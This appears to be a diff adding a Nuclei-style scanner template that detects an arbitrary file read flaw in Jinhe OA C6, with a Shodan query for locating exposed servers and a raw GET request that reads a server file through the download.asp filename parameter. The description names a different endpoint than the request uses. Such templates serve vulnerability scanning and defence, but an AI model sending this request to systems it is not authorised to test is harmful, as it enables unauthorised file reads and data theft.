@@ -1,0 +1,31 @@
+id: JinheOA_C6_download_FileReads
+
+info:
+  name: JinheOA_C6_download_FileReads
+  author: HK
+  severity: high
+  description: 金和OA C6/c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx接口存在任意文件读取漏洞
+  metadata:
+    max-request: 1
+    shodan-query: body="JHsoft.UI.Lib/skin/default/skin.css"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=download.asp HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+      - filename
